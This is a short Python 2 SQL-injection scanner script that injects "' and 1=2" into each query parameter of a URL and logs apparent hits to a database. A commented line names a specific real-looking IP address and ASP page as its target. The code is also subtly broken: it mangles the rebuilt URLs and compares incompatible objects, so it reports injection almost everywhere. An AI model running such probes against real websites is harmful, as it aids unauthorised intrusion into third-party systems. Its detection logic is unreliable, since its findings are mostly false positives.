# encoding=utf-8
import requests
import json
from sqlDB import SQLConnect
'''
url=http://222.206.181.203/bhdsweb/zhbwdgsnry.asp?gsid=5&cpfbfs=1
'''
payload='\' and 1=2'
def sql(url):
    c=requests.get(url)
    if '?' in url:
        domain = url.split('?')[0]
        _url = url.split('?')[-1]
        pararm = {}
        for val in _url.split("&"):
            pararm[val.split("=")[0]] = val.split("=")[-1]
        urls = []
        for val in pararm.values():
            new_url = domain + _url.replace(val, "Payload")
            urls.append(new_url)
        for __url in urls:
            try:
                content = requests.get(__url.replace('Payload', payload)).content
                if content!=c:
                    SQLConnect.insertsx('sql',url)
                    return json.dumps(dict(status="1",url=__url))
            except Exception, e:
                pass
    return json.dumps(dict(status="0", dec="can not find sql"))
#print sql('http://222.206.181.203/bhdsweb/zhbwdgsnry.asp?gsid=5&cpfbfs=1')
